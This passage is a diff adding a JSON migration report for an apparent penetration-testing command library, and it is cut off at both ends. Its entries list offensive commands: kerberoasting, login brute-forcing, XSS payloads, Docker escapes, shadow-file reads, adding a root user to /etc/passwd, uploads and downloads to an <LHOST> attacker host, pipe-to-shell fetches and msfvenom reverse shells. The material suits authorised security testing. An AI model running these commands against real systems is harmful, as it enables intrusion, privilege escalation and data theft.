+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "Rubeus.exe kerberoast",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "rubeus-exe-kerberoast",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "icacls C:\\Progra~1\\*",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "icacls-c-progra",
+      "sample_file": "data/commands/post-exploit/windows.json"
+    },
+    {
+      "text": "Manual review of find output",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "manual-review-of",
+      "sample_file": "data/commands/post-exploit/linux-suid-basic-commands.json"
+    },
+    {
+      "text": "Use LinEnum if LinPEAS fails",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "use-linenum-if",
+      "sample_file": "data/commands/post-exploit/linux.json"
+    },
+    {
+      "text": "Manual enumeration with individual commands",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "manual-enumeration-with",
+      "sample_file": "data/commands/post-exploit/linux.json"
+    },
+    {
+      "text": "Use curl instead of wget",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "use-curl-instead",
+      "sample_file": "data/commands/post-exploit/linux.json"
+    },
+    {
+      "text": "Use LinPEAS for more comprehensive scan",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "use-linpeas-for",
+      "sample_file": "data/commands/post-exploit/linux.json"
+    },
+    {
+      "text": "Use pspy to monitor processes",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "use-pspy-to",
+      "sample_file": "data/commands/post-exploit/linux.json"
+    },
+    {
+      "text": "Use LinPEAS which includes capability check",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "use-linpeas-which",
+      "sample_file": "data/commands/post-exploit/linux.json"
+    },
+    {
+      "text": "Use metasploit NFS scanner",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "use-metasploit-nfs",
+      "sample_file": "data/commands/post-exploit/linux.json"
+    },
+    {
+      "text": "Use linpeas.sh or linenum.sh for automated enumeration with capabilities check",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "use-linpeas-sh",
+      "sample_file": "data/commands/post-exploit/linux-capabilities-commands.json"
+    },
+    {
+      "text": "Use linpeas.sh capabilities module for automated classification",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "use-linpeas-sh",
+      "sample_file": "data/commands/post-exploit/linux-capabilities-commands.json"
+    },
+    {
+      "text": "Man pages: man 7 capabilities (understand what capability enables)",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "man-pages-man",
+      "sample_file": "data/commands/post-exploit/linux-capabilities-commands.json"
+    },
+    {
+      "text": "Binary name extracted from getcap output",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "binary-name-extracted",
+      "sample_file": "data/commands/post-exploit/linux-capabilities-commands.json"
+    },
+    {
+      "text": "GTFOBins technique researched and understood",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "gtfobins-technique-researched",
+      "sample_file": "data/commands/post-exploit/linux-capabilities-commands.json"
+    },
+    {
+      "text": "Search SYSVOL for GPP passwords",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "search-sysvol-for",
+      "sample_file": "data/commands/enumeration/ad-powerview-core.json"
+    },
+    {
+      "text": "Manual iteration without recursion",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "manual-iteration-without",
+      "sample_file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+    },
+    {
+      "text": "Search patterns: *sql*, *backup*, *service*, *admin*",
+      "count": 1,
+      "category": "unknown",
+      "action": "MANUAL_REVIEW_PRESERVE",
+      "preservation_note": "Review and determine best preservation method",
+      "suggested_id": "search-patterns-sql",
+      "sample_file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+    }
+  ],
+  "by_action": {
+    "CREATE_TOOL_CMD": [
+      {
+        "text": "nessus scan",
+        "file": "data/commands/recon.json",
+        "suggested_id": "nessus-scan",
+        "preservation_note": "Create command for tool with action"
+      },
+      {
+        "text": "burp intruder",
+        "file": "data/commands/web/general.json",
+        "suggested_id": "burp-intruder",
+        "preservation_note": "Create command for tool with action"
+      },
+      {
+        "text": "burp intruder",
+        "file": "data/commands/web/wordpress.json",
+        "suggested_id": "burp-intruder",
+        "preservation_note": "Create command for tool with action"
+      },
+      {
+        "text": "wfuzz -z file,<WORDLIST> --hc 200 -d 'log=admin&pwd=FUZZ' <URL>/wp-login.php",
+        "file": "data/commands/web/wordpress.json",
+        "suggested_id": "wfuzz-z-file",
+        "preservation_note": "Create command for tool with action"
+      },
+      {
+        "text": "wpscan-enumerate-all (to discover usernames)",
+        "file": "data/commands/web/wordpress.json",
+        "suggested_id": "wpscan-enumerate-all",
+        "preservation_note": "Create command for tool with action"
+      },
+      {
+        "text": "burp suite XML-RPC plugin",
+        "file": "data/commands/web/wordpress.json",
+        "suggested_id": "burp-suite-xml",
+        "preservation_note": "Create command for tool with action"
+      },
+      {
+        "text": "wfuzz -c -z file,<WORDLIST> -d \"fm_usr=<USER>&fm_pwd=FUZZ\" --hs \"<FAIL_STRING>\" http://<TARGET>/<PAGE>",
+        "file": "data/commands/enumeration/password-attacks-hydra.json",
+        "suggested_id": "wfuzz-c-z",
+        "preservation_note": "Create command for tool with action"
+      }
+    ],
+    "CREATE_PAYLOAD_CMD": [
+      {
+        "text": "<svg onload=alert(1)>",
+        "file": "data/commands/web/general.json",
+        "suggested_id": "xss-test-svg-onload",
+        "preservation_note": "Create XSS test command with payload in command field"
+      },
+      {
+        "text": "<body onload=alert(1)>",
+        "file": "data/commands/web/general.json",
+        "suggested_id": "xss-test-body-onload",
+        "preservation_note": "Create XSS test command with payload in command field"
+      }
+    ],
+    "CREATE_EXAMPLE_CMD": [
+      {
+        "text": "python requests.post()",
+        "file": "data/commands/web/general.json",
+        "suggested_id": "python-requests-post",
+        "preservation_note": "Create command entry for language-specific alternative"
+      }
+    ],
+    "CREATE_FULL_CMD": [
+      {
+        "text": "curl -s <URL>/feed/ | grep generator",
+        "file": "data/commands/web/wordpress.json",
+        "suggested_id": "curl-s-url",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "cat /proc/*/cmdline | tr '\\0' ' '",
+        "file": "data/commands/monitoring/process-enumeration.json",
+        "suggested_id": "cat-proc-cmdline",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "ps aux | grep <PATTERN>",
+        "file": "data/commands/monitoring/process-enumeration.json",
+        "suggested_id": "ps-aux-grep",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "ps aux | grep <PROCESS_NAME> | awk '{print $2}'",
+        "file": "data/commands/monitoring/process-enumeration.json",
+        "suggested_id": "ps-aux-grep",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "cat /proc/<PID>/cmdline | tr '\\0' ' '",
+        "file": "data/commands/monitoring/process-enumeration.json",
+        "suggested_id": "cat-proc-pid",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "cat /var/spool/cron/crontabs/<USERNAME>",
+        "file": "data/commands/monitoring/scheduled-tasks.json",
+        "suggested_id": "cat-var-spool",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "less /etc/crontab",
+        "file": "data/commands/monitoring/scheduled-tasks.json",
+        "suggested_id": "less-etc-crontab",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "find /etc/cron* -type f",
+        "file": "data/commands/monitoring/scheduled-tasks.json",
+        "suggested_id": "find-etc-cron",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "at (command-line AT utility)",
+        "file": "data/commands/monitoring/scheduled-tasks.json",
+        "suggested_id": "at-command-line",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "ls -la /var/spool/at/",
+        "file": "data/commands/monitoring/scheduled-tasks.json",
+        "suggested_id": "ls-la-var",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "tail-follow-log /var/log/syslog",
+        "file": "data/commands/monitoring/log-monitoring.json",
+        "suggested_id": "tail-follow-log",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "journalctl -k (kernel messages via journald)",
+        "file": "data/commands/monitoring/log-monitoring.json",
+        "suggested_id": "journalctl-k-kernel",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "journalctl -kf (kernel messages via journald)",
+        "file": "data/commands/monitoring/log-monitoring.json",
+        "suggested_id": "journalctl-kf-kernel",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "journalctl -u ssh | grep -i failed",
+        "file": "data/commands/monitoring/log-monitoring.json",
+        "suggested_id": "journalctl-u-ssh",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "journalctl | grep sudo.*COMMAND",
+        "file": "data/commands/monitoring/log-monitoring.json",
+        "suggested_id": "journalctl-grep-sudo",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "journalctl | grep 'Failed password'",
+        "file": "data/commands/monitoring/log-monitoring.json",
+        "suggested_id": "journalctl-grep-failed",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "dmesg-kernel-messages (kernel only)",
+        "file": "data/commands/monitoring/log-monitoring.json",
+        "suggested_id": "dmesg-kernel-messages",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "ls /etc/init.d/",
+        "file": "data/commands/monitoring/service-enumeration.json",
+        "suggested_id": "ls-etc-init",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "top -bn1 -o %MEM | head -20",
+        "file": "data/commands/monitoring/resource-monitoring.json",
+        "suggested_id": "top-bn-o",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "top -bn1 -o %CPU | head -20",
+        "file": "data/commands/monitoring/resource-monitoring.json",
+        "suggested_id": "top-bn-o",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "cat /proc/meminfo",
+        "file": "data/commands/monitoring/resource-monitoring.json",
+        "suggested_id": "cat-proc-meminfo",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "top -bn1",
+        "file": "data/commands/monitoring/resource-monitoring.json",
+        "suggested_id": "top-bn",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "sar -u 1 5",
+        "file": "data/commands/monitoring/resource-monitoring.json",
+        "suggested_id": "sar-u",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "cat /proc/loadavg",
+        "file": "data/commands/monitoring/resource-monitoring.json",
+        "suggested_id": "cat-proc-loadavg",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "ls -l /proc/*/fd/ (manual check)",
+        "file": "data/commands/monitoring/resource-monitoring.json",
+        "suggested_id": "ls-l-proc",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "lsof +d <DIRECTORY> (non-recursive, faster)",
+        "file": "data/commands/monitoring/resource-monitoring.json",
+        "suggested_id": "lsof-d-directory",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "cat /var/log/wtmp | utmpdump",
+        "file": "data/commands/monitoring/resource-monitoring.json",
+        "suggested_id": "cat-var-log",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "cat /etc/group | grep docker",
+        "file": "data/commands/post-exploit/linux-docker-commands.json",
+        "suggested_id": "cat-etc-group",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "stat /var/run/docker.sock",
+        "file": "data/commands/post-exploit/linux-docker-commands.json",
+        "suggested_id": "stat-var-run",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh",
+        "file": "data/commands/post-exploit/linux-docker-commands.json",
+        "suggested_id": "docker-run-pid",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "cat /mnt/etc/passwd",
+        "file": "data/commands/post-exploit/linux-docker-commands.json",
+        "suggested_id": "cat-mnt-etc",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "docker-mount-escape (preferred method)",
+        "file": "data/commands/post-exploit/linux-docker-commands.json",
+        "suggested_id": "docker-mount-escape",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh",
+        "file": "data/commands/post-exploit/linux-docker-commands.json",
+        "suggested_id": "docker-run-pid",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "docker-mount-escape (simpler)",
+        "file": "data/commands/post-exploit/linux-docker-commands.json",
+        "suggested_id": "docker-mount-escape",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "curl -T <FILE> ftp://<LHOST>/",
+        "file": "data/commands/post-exploit/general-transfer.json",
+        "suggested_id": "curl-t-file",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "python -m SimpleHTTPServer",
+        "file": "data/commands/post-exploit/general-transfer.json",
+        "suggested_id": "python-m-simplehttpserver",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "wget via PHP: <?php system('wget http://<LHOST>/<FILE>'); ?>",
+        "file": "data/commands/post-exploit/general-transfer.json",
+        "suggested_id": "wget-via-php",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "curl via PHP: <?php system('curl -O http://<LHOST>/<FILE>'); ?>",
+        "file": "data/commands/post-exploit/general-transfer.json",
+        "suggested_id": "curl-via-php",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "python -m SimpleHTTPServer 8000 (Python 2)",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "python-m-simplehttpserver",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Use /dev/tcp for raw download",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "use-dev-tcp",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "curl <URL> | bash (pipe to shell)",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "curl-url-bash",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Use -k for self-signed certificates",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "use-k-for",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "wget <URL> -O <FILE> (PowerShell alias)",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "wget-url-o",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "curl <URL> -o <FILE> (PowerShell alias)",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "curl-url-o",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Use with -i for SSH key: scp -i key.pem file target:/path",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "use-with-i",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Run directly: \\\\\\\\<LHOST>\\\\share\\\\file.exe",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "run-directly-lhost",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "socat TCP-LISTEN:port,reuseaddr,fork file:output",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "socat-tcp-listen",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Use base64 encoding for text-safe transfer",
+        "file": "data/commands/post-exploit/exfiltration.json",
+        "suggested_id": "use-base-encoding",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "PowerUp's Find-ProcessDLLHijack",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "import-powerup",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Watson (PowerShell-based)",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "watson-powershell-based",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "whoami /all",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "whoami-all",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "PowerUp.ps1 Invoke-AllChecks",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "import-powerup",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "sc sdshow <service>",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "sc-sdshow-service",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "dir /s /b C:\\*.dll 2>nul",
+        "file": "data/commands/post-exploit/windows.json",
+        "suggested_id": "dir-s-b",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "cat /etc/sudoers (if readable)",
+        "file": "data/commands/post-exploit/linux-sudo-commands.json",
+        "suggested_id": "cat-etc-sudoers",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "ls -la /root/ (check if can list root directory)",
+        "file": "data/commands/post-exploit/linux-sudo-commands.json",
+        "suggested_id": "ls-la-root",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "cat /etc/shadow (attempt to read directly)",
+        "file": "data/commands/post-exploit/linux-sudo-commands.json",
+        "suggested_id": "cat-etc-shadow",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "ls -la /root/",
+        "file": "data/commands/post-exploit/linux-suid-basic-commands.json",
+        "suggested_id": "ls-la-root",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "cat /etc/shadow",
+        "file": "data/commands/post-exploit/linux-suid-basic-commands.json",
+        "suggested_id": "cat-etc-shadow",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "find <PATH> -name '*.php' -exec grep -i password {} +",
+        "file": "data/commands/post-exploit/credential-discovery.json",
+        "suggested_id": "find-path-name",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "find <PATH> -name 'config*' -exec cat {} +",
+        "file": "data/commands/post-exploit/credential-discovery.json",
+        "suggested_id": "find-path-name",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "getent passwd | grep -v nologin | cut -d: -f1",
+        "file": "data/commands/post-exploit/credential-discovery.json",
+        "suggested_id": "getent-passwd-grep",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Check /etc/sudoers if readable",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "check-etc-sudoers",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "grep -r '/etc/cron' /etc/",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "grep-r-etc",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "echo 'newroot:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "echo-newroot-salt",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Manual search in /usr/bin and /usr/sbin",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "manual-search-in",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "cat /proc/version",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "cat-proc-version",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "nmap --script nfs-showmount",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "nmap-script-nfs",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "docker run -v /:/hostfs -it ubuntu bash",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "docker-run-v",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "find / -name authorized_keys",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "find-name-authorized",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "grep -r 'PRIVATE KEY' /home 2>/dev/null",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "grep-r-private",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "cat /etc/sudoers 2>/dev/null",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "cat-etc-sudoers",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "cat /etc/os-release",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "cat-etc-os",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "wget -O - https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "wget-o-https",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "watch -n 1 'ps aux | grep -v grep'",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "watch-n-ps",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "showmount -e localhost",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "showmount-e-localhost",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "ls -la /bin/systemctl",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "ls-la-bin",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "getcap /bin/systemctl",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "getcap-bin-systemctl",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "find /etc -name '*.sh' -exec grep '\\*' {} \\;",
+        "file": "data/commands/post-exploit/linux.json",
+        "suggested_id": "find-etc-name",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Search exploit-db for capability-based techniques",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+        "suggested_id": "search-exploit-db",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Use different exploitation technique for same capability/binary",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+        "suggested_id": "use-different-exploitation",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Identified capability/binary combination from previous steps",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+        "suggested_id": "identified-capability-binary",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Test shadow file read: cat /etc/shadow 2>/dev/null | grep root",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+        "suggested_id": "test-shadow-file",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Test sudo without password: sudo -l (if sudoers allows)",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+        "suggested_id": "test-sudo-without",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Edit /etc/shadow instead if cap allows: remove root password hash",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+        "suggested_id": "edit-etc-shadow",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Use cp command with cap_dac_override to overwrite passwd: cp modified_passwd /etc/passwd",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+        "suggested_id": "use-cp-command",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Use tar to extract modified passwd over existing: tar -xzf passwd.tar.gz -C /",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+        "suggested_id": "use-tar-to",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "ls \\\\<TARGET>\\<SHARE>",
+        "file": "data/commands/enumeration/ad-session-share-enum.json",
+        "suggested_id": "ls-target-share",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "python scripts: gpp-decrypt.py",
+        "file": "data/commands/enumeration/ad-session-share-enum.json",
+        "suggested_id": "python-scripts-gpp",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "$env:USERDNSDOMAIN | ForEach-Object { 'DC=' + ($_ -replace '\\.',',DC=') }",
+        "file": "data/commands/enumeration/ad-powershell-ldap.json",
+        "suggested_id": "env-userdnsdomain-foreach",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "hashcat -m 22921 (aes-256-cbc only, NOT aes-256-ctr)",
+        "file": "data/commands/enumeration/password-attacks-john.json",
+        "suggested_id": "hashcat-m-aes",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Manual: for pw in $(cat wordlist); do echo -n \"$pw\" | md5sum; done",
+        "file": "data/commands/enumeration/password-attacks-hashcat.json",
+        "suggested_id": "manual-for-pw",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "mysql -h <TARGET> -u <USER> -p (interactive password prompt)",
+        "file": "data/commands/exploitation/database-access.json",
+        "suggested_id": "mysql-h-target",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "postgres-direct-connect (with password inline)",
+        "file": "data/commands/exploitation/database-access.json",
+        "suggested_id": "postgres-direct-connect",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "smbmap -u <USER> -p <PASS> -H <TARGET>",
+        "file": "data/commands/exploitation/ad-lateral-movement-psexec.json",
+        "suggested_id": "smbmap-u-user",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "grep -r '<QUERY>' /usr/share/metasploit-framework/modules/exploits/",
+        "file": "data/commands/exploitation/metasploit-core.json",
+        "suggested_id": "grep-r-query",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "nmap <OPTIONS> <TARGET> -oX scan.xml && msf-db-import scan.xml",
+        "file": "data/commands/exploitation/metasploit-core.json",
+        "suggested_id": "nmap-options-target",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "msfvenom -p linux/x86/shell_reverse_tcp",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "msfvenom-p-linux",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "msfvenom -p linux/x64/meterpreter/reverse_tcp",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "msfvenom-p-linux",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "msfvenom -p windows/shell_reverse_tcp",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "msfvenom-p-windows",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "msfvenom -p windows/meterpreter/reverse_tcp",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "msfvenom-p-windows",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "google: site:exploit-db.com <SERVICE>",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "google-site-exploit",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Update ExploitDB: searchsploit -u",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "update-exploitdb-searchsploit",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Find exploit first: searchsploit <SERVICE> <VERSION>",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "find-exploit-first",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Get script help: nmap --script-help <SCRIPT_NAME>",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "get-script-help",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Verify web server is up: curl -I http://<TARGET>:<PORT>",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "verify-web-server",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Identify web technology: whatweb http://<TARGET>",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "identify-web-technology",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Verify web server is up: curl -I http://<TARGET>:<PORT>",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "verify-web-server",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "Run gobuster first: gobuster-dir-common (complement findings)",
+        "file": "data/commands/exploitation/general.json",
+        "suggested_id": "run-gobuster-first",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "nc -nvlp <LPORT> (for non-staged shells only)",
+        "file": "data/commands/exploitation/metasploit-handlers.json",
+        "suggested_id": "nc-nvlp-lport",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "WinRM enabled on target (port 5985/5986)",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+        "suggested_id": "winrm-enabled-on",
+        "preservation_note": "Create complete command entry"
+      },
+      {
+        "text": "pth-impacket-psexec per target",
